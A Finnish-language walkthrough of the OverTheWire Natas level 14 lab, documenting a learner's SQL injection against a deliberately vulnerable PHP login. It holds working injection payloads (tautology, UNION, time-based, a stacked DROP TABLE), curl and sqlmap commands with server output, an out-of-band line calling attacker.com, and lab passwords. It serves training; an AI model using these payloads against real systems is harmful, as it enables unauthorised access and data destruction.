# level 14 - START HERE

natas14 : z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

Perus selvittämistä ja tässä näyttää ainakin koodin ainakin on *username ; password* mahtaako olla koskien SQL injektiota tai tavallinen shell injektiota? 

PHP - koodikielessä ainakin (_index-source.html_) on *query* - kyselly, että hakee käyttäjännimen ja salasanansa, että jos täsmää sitten päästään eteenpäin, että pääsee hakee seuraavan levelin salasanansa, eli on **SQL injektio**.

ainakin pikaisella testauksella syötä **username:username** , **password:password** - *access denied!*

![alt text](./kuvat-level11-15/natas14-0.png)

![alt text](./kuvat-level11-15/natas14-1.png)


Tämä osuus ainakin kertoo kyseessä on SQL injektio ja tämä funktio:
```
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

```

Sekä mahdolliset avain sanat meitä varmaan kiinnostaa ja debbugoida on ainakin.. `GET`, `username`, `password` ja `debug` parametrit. Tärkeimistä ainakin tarkistettu F12 ja url perään laitettu `/robots.txt`, että ei apua joten alettaan käydä kiinni mm. `curl` - komennon kautta ja jne.


## Level 14 - 1 SQL injektio

SQL-injektio on hyökkäysmenetelmä, jossa käyttäjä syöttää haitallista SQL-koodia sovelluksen lomakkeisiin tai URL-parametreihin, jotka eivät ole kunnolla suojattu. SQL-injektiota voidaan kokeilla lisäämällä erityisiä merkkejä (kuten `' OR 1=1 --`) URL-parametreihin ja katsoa, kuinka palvelin reagoi.

Jos palvelin ei ole suojattu kunnolla, se voi altistua SQL-injektiolle ja paljastaa tietoja tai jopa antaa mahdollisuuden kirjautua sisään ilman oikeaa salasanaa.

Esim. yritettään päästä login sisäänsä sen **username;password** 
```
username=' OR '1'='1
password=' OR '1'='1
```

- SQL kysely; SELECT * FROM users WHERE username = 'alice' AND password = 's3cr3t';

**muita esim.** <br>
```
SELECT * FROM users WHERE username = 'alice' AND password = 's3cr3t';
SELECT * FROM users WHERE username = 'alice' OR '1'='1' AND password = 's3cr3t' OR '1'='1';
```

**Miksi juuri "alice"?** <br>
Alice on valittu mahdollisesti esimerkkinä, koska se on helppo arvata ja käyttää testissä. Jos tietoturva-asiantuntijat suunnittelevat tällaisia haasteita, he voivat käyttää yleisiä nimiä (kuten "alice", "bob", "admin"), jotta voit kokeilla niitä oletuksena.


Alice voi myös liittyä johonkin järjestelmän oletusasetuksiin, tai se voi olla oletuskäyttäjä (vaikka tämä on vähemmän todennäköistä).

Täysin mahdollista, että tässä URL:ssa on SQL-injektio-aukko, ja "alice" voi olla käyttäjätunnus, jota pyritään hyödyntämään. SQL-injektiota voidaan kokeilla lisäämällä erityisiä merkkejä (kuten `' OR 1=1 --`) URL-parametreihin ja katsoa, kuinka palvelin reagoi.

Jos palvelin ei ole suojattu kunnolla, se voi altistua SQL-injektiolle ja paljastaa tietoja tai jopa antaa mahdollisuuden kirjautua sisään ilman oikeaa salasanaa.

## SQL Injektio - Whitehat
**white hat -testaajat** (eli eettiset hakkeroijat, penetraatiotestaajat jne.) käyttävät hyvin usein juuri tuollaista SQL-injektiorakennetta testatessaan, onko verkkosovellus altis SQL-injektiolle.

**Klassinen SQL-injektio:** <br><br>
Jos lomake tai URL-parametrit välitetään suoraan SQL-kyselyyn ilman suojausta, kuten:<br>
`SELECT * FROM users WHERE username = '[syöte]' AND password = '[syöte]';`

password (syöte) siis joku satunnainen sana väliin <br>

<br>
Tällöin kyselystä tulee käytännössä: <br>

`SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '';`

<br>
Mitä tämä tekee?<br>

```
' OR 1=1 --:
' päättää alkuperäisen stringin.
OR 1=1 on aina tosi, joten se ohittaa autentikoinnin.
-- on SQL-kommenttimerkki, joka kommentoi loput rivistä pois (eli AND password = ... jää huomiotta).
```

### SQL injektio muita menetelmiä 

nykyaikainen white hat -testaus ja hyökkäystavat voivat käyttää monia eri tekniikoita riippuen sovelluksen rakenteesta, suojauksista ja tietokannasta.


1. UNION SQL Injection <br>
' UNION SELECT username, password FROM users --


2. Tautology Injection (klassikko: OR 1=1) <br>
' OR 1=1 --


3. Blind SQL Injection (Boolean-based) <br>
' AND 1=1 --   # toimii
' AND 1=2 --   # ei toimi


4. Time-based Blind SQL Injection <br>
' OR IF(1=1, SLEEP(5), 0) -- 


5. Error-based SQL Injection <br>
' ORDER BY 100 -- 


6. Stacked Queries (jos sallittu) <br>
'; DROP TABLE users; --


7. Second-order SQL Injection <br>
Tätä ei suoriteta heti, vaan tallennetaan ensin ja suoritetaan myöhemmin toisessa yhteydessä. Eli ensin rekisteröidään käyttäjänimi ja sitten 


8. Out-of-Band SQL Injection <br>
Tämä vaatii erityisiä olosuhteita, ja SQL-injektio lähettää tiedon ulos järjestelmästä, esim. DNS-kyselynä: <br>
' OR LOAD_FILE('\\\\attacker.com\\file') -- 



9. Using SQL Comments Smartly <br>
-- (yksirivinen kommentti) <br>
/* comment */ (monirivinen) <br>
%23 (URL-koodattu #, MySQL-kommentti) <br>
esim: `' OR 1=1 /*'`


✅ Miten white hat testaa eri metodit? <br>
- Kokeilee klassista: `' OR 1=1 --`
- Testaa error-muotoja ja katsoo mitä virheilmoituksia tulee <br>
- Testaa blind-injektiot jos mitään ei palaudu <br>
- Vahvistaa että kyseessä on injektio testaamalla SLEEP, ORDER BY, jne. <br>
- Käyttää automatisoituja työkaluja kuten sqlmap <br>


---

# Level 14 - 2 - virallinen testi ja harjoitus - START HERE

Tähän väliin tulee muutamia kuvia, josta on suoritettu testejä ja vasta sen jälkeen toimivista ainakin osa antoi pientä vihjettä.

**TESTI1** <br>
![alt text](./kuvat-level11-15/natas14-2.png)

**TESTI2** - et lisäsin alkuun ton _sadf'_ 
![alt text](./kuvat-level11-15/natas14-3.png)

**TESTI3** tässä alkoi tapahtua jotakin seuraavina, että antoi tämän tiedostonhakemiston polunsa eli **var/www/natas/natas14/index.php** ja jne.
![alt text](./kuvat-level11-15/natas14-4.png)
![alt text](./kuvat-level11-15/natas14-5.png)

**TESTI4** seuraava testinä joka toimii sama ideana kuin aikaisempi, mutta virheitä ja voi ollaan lähellä maalia. 
![alt text](./kuvat-level11-15/natas14-6.png)
![alt text](./kuvat-level11-15/natas14-7.png)

**TESTI5** <br>
![alt text](./kuvat-level11-15/natas14-8.png)
![alt text](./kuvat-level11-15/natas14-9.png)

**TESTI6** seuraavina testeinä aloin kokeilla iskeä sitä SQL-injektiota URL-perään, kun PHP-koodi pätkässä viittasi tämän _if_ lausekkeensa `if(array_key_exists("debug", $_GET)) {`. Perään sijoitin pari-muutama  `&&` merkin, koska ne viittaa kyseisen lomakkeen username;password formaattia.  
![alt text](./kuvat-level11-15/natas14-10.png)


**TESTI7** tämä on sama idea kuin aikaisempi, mutta perässä on tämä `' OR 1=1 --` - joka on enkodaattu ja näin se sijoittuu URL-perään. Jos menisi lomakkeen kautta se ois kuin `"admin' OR 1=1 --`.

**`' OR 1=1 --`** - enkoodattuna: <br>
Tämä enkodaattu pätee myös todellisuudessaan kirjauttumisen formaattissa ja URL:issa , periaate pätee todellisuudessakin web-sovelluksissa, jos ne ovat haavoittuvia SQL-injektiolle.

![alt text](./kuvat-level11-15/natas14-11.png)


**TESTI8** - tämä on sama kuin aikaisempi _TESTI7_ mutta perässä lisäsin erikoismerkin kuin `"` - ja tässä vähitelen koskien tätä SQL injektiota, että testataan lisätä username ja password kenttään menisi tällä merkillä. 

![alt text](./kuvat-level11-15/natas14-12.png)

**TESTI9** ja nyt päästiin, mutta jälkimmäisessä _TESTI10_ on tarkennusta vähäsen
![alt text](./kuvat-level11-15/natas14-13.png)

Tämä enkoodattu (URL) 
`username=admin%22%20OR%201%3D1%20--&password=admin'` 
vastaa --> 
dekoodattua (alempi formaatti): 
```
username=admin" OR 1=1 --
password=admin
```

Pientä tarkennusta koskien miten tämä toimikaan (vscode muistiinpanoa) ja tämä **testi9**: 
`http://natas14.natas.labs.overthewire.org/index.php?debug=1&&username=admin%22%27%20OR%201%3D1%20--&&password=admin%27%20OR%201%3D1%20--%22`

dekodaattu menisi näin: 
```
username = admin"' OR 1=1 --
password = admin' OR 1=1 --"
```

<br>

**TESTI10** ,  tämä on sama idea kuin _testi9_ , mutta mentiin lomakkeen formaattin kautta kirjauttumisen prosessilla. Molemmat ovat samoja sisältöjä, mutta eri kuljetusmuoto. 

Alemman pieni toisto:
```
admin"' OR 1=1 --
password' OR 1=1 --"
```

![alt text](./kuvat-level11-15/natas14-14.png)
![alt text](./kuvat-level11-15/natas14-15.png)

---

# Level 14 - 3 Kali Linux version - START HERE

Tämä menisi kali linux versiolla, mutta skippaan osan ja tässä mennään curl komennolla, ja just aikaisempien kuvien URL komento vain liittettään siihen ja näin saattaisiin vastaus - aikalailla kuin _copy paste_. 


```
┌──(kali㉿kali)-[~]
└─$ curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Ylemmästä ainakin huomataan kirjauttumisen lomakkeensa, että input vähä kuin id nimetty "username/password".

Pikainen tarkistus tuosta välilehden polusta ainakin, mutta sekalaista höpönlöpöä ainakin näkyvinä. 

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org/index-source.html"
<code><span style="color: #000000">
&lt;html&gt;<br />&lt;head&gt;<br />&lt;!--&nbsp;This&nbsp;stuff&nbsp;in&nbsp;the&nbsp;header&nbsp;has&nbsp;nothing&nbsp;to&nbsp;do&nbsp;with&nbsp;the&nbsp;level&nbsp;--&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;type="text/css"&nbsp;href="http://natas.labs.overthewire.org/css/level.css"&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/jquery-ui.css"&nbsp;/&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/wechall.css"&nbsp;/&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-ui.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;<br />&lt;script&gt;var&nbsp;wechallinfo&nbsp;=&nbsp;{&nbsp;"level":&nbsp;"natas14",&nbsp;"pass":&nbsp;"&lt;censored&gt;"&nbsp;};&lt;/script&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;h1&gt;natas14&lt;/h1&gt;<br />&lt;div&nbsp;id="content"&gt;<br /><span style="color: #0000BB">&lt;?php<br /></span><span style="color: #007700">if(</span><span style="color: #0000BB">array_key_exists</span><span style="color: #007700">(</span><span style="color: #DD0000">"username"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_REQUEST</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$link&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">mysqli_connect</span><span style="color: #007700">(</span><span style="color: #DD0000">'localhost'</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'natas14'</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'&lt;censored&gt;'</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">mysqli_select_db</span><span style="color: #007700">(</span><span style="color: #0000BB">$link</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'natas14'</span><span style="color: #007700">);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$query&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"SELECT&nbsp;*&nbsp;from&nbsp;users&nbsp;where&nbsp;username=\""</span><span style="color: #007700">.</span><span style="color: #0000BB">$_REQUEST</span><span style="color: #007700">[</span><span style="color: #DD0000">"username"</span><span style="color: #007700">].</span><span style="color: #DD0000">"\"&nbsp;and&nbsp;password=\""</span><span style="color: #007700">.</span><span style="color: #0000BB">$_REQUEST</span><span style="color: #007700">[</span><span style="color: #DD0000">"password"</span><span style="color: #007700">].</span><span style="color: #DD0000">"\""</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">array_key_exists</span><span style="color: #007700">(</span><span style="color: #DD0000">"debug"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Executing&nbsp;query:&nbsp;</span><span style="color: #0000BB">$query</span><span style="color: #DD0000">&lt;br&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">mysqli_num_rows</span><span style="color: #007700">(</span><span style="color: #0000BB">mysqli_query</span><span style="color: #007700">(</span><span style="color: #0000BB">$link</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$query</span><span style="color: #007700">))&nbsp;&gt;&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Successful&nbsp;login!&nbsp;The&nbsp;password&nbsp;for&nbsp;natas15&nbsp;is&nbsp;&lt;censored&gt;&lt;br&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Access&nbsp;denied!&lt;br&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">mysqli_close</span><span style="color: #007700">(</span><span style="color: #0000BB">$link</span><span style="color: #007700">);<br />}&nbsp;else&nbsp;{<br /></span><span style="color: #0000BB">?&gt;<br /></span><br />&lt;form&nbsp;action="index.php"&nbsp;method="POST"&gt;<br />Username:&nbsp;&lt;input&nbsp;name="username"&gt;&lt;br&gt;<br />Password:&nbsp;&lt;input&nbsp;name="password"&gt;&lt;br&gt;<br />&lt;input&nbsp;type="submit"&nbsp;value="Login"&nbsp;/&gt;<br />&lt;/form&gt;<br /><span style="color: #0000BB">&lt;?php&nbsp;</span><span style="color: #007700">}&nbsp;</span><span style="color: #0000BB">?&gt;<br /></span>&lt;div&nbsp;id="viewsource"&gt;&lt;a&nbsp;href="index-source.html"&gt;View&nbsp;sourcecode&lt;/a&gt;&lt;/div&gt;<br />&lt;/div&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /></span>
</code>                                                                                                                  ```

```

syötin jotakin satunnaista et ainakin tooimii ja kertookin jotakin (alempi komento)

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org?debug&username=something&&passsword=random" 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<br />
<b>Notice</b>:  Undefined index: password in <b>/var/www/natas/natas14/index.php</b> on line <b>19</b><br />
Executing query: SELECT * from users where username="something" and password=""<br>Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


vähä kuin aikaisemmat testit `"admin"` ja `"admin"`: 

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org/index.php?debug=1&&username=admin&&password=admin%22%20OR%201=1%E2%80%93%20&&password=admin"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
Executing query: SELECT * from users where username="admin" and password="admin"<br>Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

```



nyt tässä on syötettu url enkoodattuna toi **"admin"' OR 1=1 --"** muodosta sinne URL username ja password kentään

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ "http://natas14.natas.labs.overthewire.org/index.php?debug=1&&username=admin%22%27%20OR%201%3D1%20--&&password=admin%27%20OR%201%3D1%20--%22"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
Executing query: SELECT * from users where username="admin"' OR 1=1 --" and password="admin' OR 1=1 --""<br>Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Kali Linux - SQLMAP version - START HERE





---

# SQL injektio mini huomio - START HERE 

pieni huomiona tämä osuus:

| Kenttä     | Syöte / URL                      | Arvo (selkokielisenä)                 | Ero ja merkitys                                                                 |
|------------|----------------------------------|----------------------------------------|----------------------------------------------------------------------------------|
| username   | Lomakesyöte                      | `admin"' OR 1=1 --`                    | Täysin identtinen injektio URL- ja lomakeversioissa.                            |
| password   | Lomakesyöte                      | `password' OR 1=1 --"`                 | Alkuosa (`password`) eroaa, mutta injektio toimii jos SQL ei hajoa.             |
| username   | URL (enkoodattu)                 | `admin"' OR 1=1 --`                    | Sama injektio kuin lomakkeessa, mutta URL-muodossa enkoodattuna.                |
| password   | URL (enkoodattu)                 | `admin' OR 1=1 --"`                    | Eroaa lomakeversiosta alkuosan (`admin`) takia – voi vaikuttaa SQL-syntaksiin.  |
| **KOKO URL** | `/index.php?...`                 | `username=admin"' OR 1=1 --`<br>`password=admin' OR 1=1 --"` | Käytännössä toimii kuten lomakesyöte, mutta erona on alkuarvon ero `password`-kentässä. |
| username   | `username=admin%22%20OR%201%3D1%20--` | `admin" OR 1=1 --`                    | URL-enkoodattu versio: `%22` vastaa `"` ja `%20` vastaa välilyöntiä |


SQL injektiossa idea on just nämä erikoismerkit kuten `"` , `'` , `"'`, `+` ja `--`. Huomoina toi keskimmäinen just pätee yhdistettynä, ja niiden yhdistelmeitä testeissä ja se pätee sekä lomakkeessa että URL:issa. 

- Tässä tapauksessa **"** (`%22`) sulkee `username`-kentän alkuperäisen arvon ja sen jälkeen **injektio toimii**: `OR 1=1 --` on SQL-lauseke, joka on tosi ja estää salasanan tarkistuksen.


## Harjoitusta kohti mestariksi

Alkuum meneekin `' OR 1=1 --` - koska se on perusideana mikä lähtee harjoittelusta. Sitä näkee nopeasti, reagoi järjestelmän jollakin tavalla, että onnistuuko kirjautuminen vai tuleeko virhettä, jäätyykö pyyntö ja tms. Tämä periaatteessa toimii kuin ensimmäinen _pingi_ eli testaa onko järjestelmässä injektiota. 

Periaatteessa tämä `' OR 1=1 --` - voi toimia pienenä lunttilappuna ja pikaisella koodina.

Jos taso menee vaikeammaksi niin lomake kenttään käytä suodatusta  `'` - merkkiä 

Muita vaiheita tulee mukaan:
- Blind SQLi (testataan vaikka `AND 1=1` vs. `AND 1=2` ja katsotaan käyttäytyminen)
- Time-based SQLi (esim. `SLEEP(5)`-pohjaiset injektiot)
- Automatisointi (sqlmap) kun payloadit monimutkaistuvat

## SQL injektio kali linux:issa
Tämä pätee `curl`- komento POST-pyyntö SQL-injektiolla:

`curl "http://target.site/login?username=admin' OR 1=1 --&password=whatever"`

```
curl -X POST http://target.site/login \
  -d "username=admin' OR 1=1 --&password=whatever"
```

Tämä on alempi komennon kuvausta tarkennuksena: 
-X POST: tehdään POST-pyyntö
-d: data, joka normaalisti tulisi lomakkeesta:
--compressed: pakkaustuki, joskus tarpeen Overthewire-labroissa
```
curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 \
  -X POST "http://natas14.natas.labs.overthewire.org/" \
  -d "username=admin\" OR 1=1 --&password=irrelevant" \
  --compressed
```


**Toinen vinkki**: tarkalleen mitä kysely tekee: 
```
curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 \
  -X POST "http://natas14.natas.labs.overthewire.org/?debug=1" \
  -d "username=admin\" OR 1=1 --&password=irrelevant"
```


**Sqlmap** - joka antaa automaattisesti erilaisia sql injektio, et tunnistaa classic/blind/time-based ja union pohjaisia, jne.
`sqlmap -u "http://target.site/login?username=admin&password=test" --batch --risk=3 --level=5`

## Selaimen SQL injektio

` " ` - kokeilin toista erikoismerkkiä, mutta ainakin toimii ja antoi seuraavan vihjeensä, sekä muutama testi ainakin näyttävän toimii.

```
Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in /var/www/natas/natas14/index.php on line 24
```

Kun käytät SQL-injektiota URLin kautta, sinun täytyy URL-enkoodata erikoismerkit, jotta ne menevät palvelimelle oikein — muuten selain tai palvelin tulkkaa ne väärin tai estää pyynnön kokonaan.

`' OR 1=1 --`- on enkoodattuna muodossa `%27%20OR%201%3D1%20--`


🔎 Miksi enkoodata?
Web-palvelimet ja selaimet odottavat, että URL:ssa on vain tietyt sallitut merkit. Jos laitat esimerkiksi ' (heittomerkki) suoraan URLiin, se voi rikkoa pyynnön tai aiheuttaa virheen jo ennen kuin se ehtii tietokantaan asti.

esim. `curl "http://example.com/login.php?username=admin%27%20OR%201%3D1%20--&password=whatever"`

Esim. tässä Natas 14 harjoituksessa: `http://natas14.natas.labs.overthewire.org/index.php?debug=1&&username=admin&&password=admin%22%20OR%201=1%E2%80%93%20&&password=admin`

## SQLMAP komento

tehokkuus ja laajuus säädetään sqlmapissa --level ja --risk -asetuksilla. Ne vaikuttavat siihen, kuinka aggressiivisesti ja syvällisesti sqlmap hyökkää.

Asetus	Merkitys
--level=1-5	- Kuinka laajasti testataan parametreja (1 = nopea, 5 = kaikki mahdolliset)
--risk=1-3	- Kuinka "riskialttiita" hyökkäyksiä käytetään (1 = turvallisia, 3 = voivat rikkoa)

**ESIM**:
SQLMAP komento POST-pyyntö esim:
```
sqlmap -u "http://natas14.natas.labs.overthewire.org/" \
  --auth-type Basic --auth-cred "natas14:YOURPASSWORD" \
  --data="username=admin&password=admin" \
  --level=5 --risk=3 --batch
```

🧠 Selitykset:
-u: URL-osoite (ei tarvitse query-parametreja tässä, koska käytetään --data)

--auth-type Basic: HTTP Basic Auth

--auth-cred: käyttäjä:salasana

--data: POST-data, jota lomake lähettää

--level=5: testaa kaikki kentät ja mutaatiot

--risk=3: kokeilee myös vaarallisempia hyökkäyksiä (esim. viiveet, tiedonhaku)

--batch: automaattivastaukset (ei kysy interaktiivisesti)


## SQL injektio koskien MYSQL komentoa

jos aikoo käyttää MySQL omaa koemntoa, mutta se ei oikeasti toimi Linux terminaalissa, koska se on eri ja sitä joutuu käyttää **PHPMYADMIN** ohjelman alla. Linux terminaalissa voi runnata MySQL komentoa eli `SELECT * FROM USERS` - jotakin linux terminaalin alta, mutta käyttää paikallisen esim. `php -r` - tai tiedostoa tai muuta menetelmänsä mm. echo (eli toista jotakin) niin se voi yhdistää yhteyden MySQL:ään. 

echo komento esim. `echo "SELECT * FROM users;" | mysql -u user -p database_name`- ja huomiona, tämä ottaa vain yhteyttä omaan tietokantaansa ei muuta, ellei ole yhdistynyt muihin tietokantoihin ohjelmiinsa. 


## Level 14 - 4 linkkejä ja ohjeita; 

https://nils-maeurer.de/post/overthewire-natas14-15/
https://www.abatchy.com/2016/11/natas-level-14-and-15

https://www.youtube.com/watch?v=cCQFblftpr8


https://learnhacking.io/overthewire-natas-level-14-walkthrough/

https://medium.com/@enesaladag/overthewires-natas14-b83d28872ffe











